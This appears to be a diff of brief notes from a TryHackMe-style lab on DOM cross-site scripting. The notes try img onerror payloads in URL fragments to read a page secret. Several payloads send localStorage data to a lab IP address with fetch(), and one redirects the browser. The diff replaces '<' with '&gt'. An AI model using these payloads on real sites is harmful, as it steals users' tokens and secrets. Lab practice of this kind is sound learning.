@@ -2,18 +2,18 @@ how to delete all birthdays
 -> to get to know `?secret=` value 
 -> using DOM xss ? 
 
-https://realwebsite.com#<img src=1 onerror=alert(document.secret)></img>
+https://realwebsite.com#&gtimg src=1 onerror=alert(document.secret)></img>
 => checking the dom xss attack is working 
 => using this how to know the secret value ? 
 document.secret? 
 
-https://realwebsite.com#<img src=1 onerror="fetch('http://10.10.104.193:8000?secret=' + localStorage.getItem('secret'))"></img>
+https://realwebsite.com#&gtimg src=1 onerror="fetch('http://10.10.104.193:8000?secret=' + localStorage.getItem('secret'))"></img>
 
 &gtimg src=1 onerror="fetch('http://10.10.104.193:8000' + localStorage.getItem('secret'))">
 
-https://realwebsite.com#<img src = 1 onerror=alert(localStorage.getItem('secret'))>
+https://realwebsite.com#&gtimg src = 1 onerror=alert(localStorage.getItem('secret'))>
 
-https://realwebsite.com#<img src=1 onerror=alert(panda)></img>
+https://realwebsite.com#&gtimg src=1 onerror=alert(panda)></img>
 
 
 &gtimg src=1 onerror="window.location='http://lists.tryhackme.loc:5001/ping'">
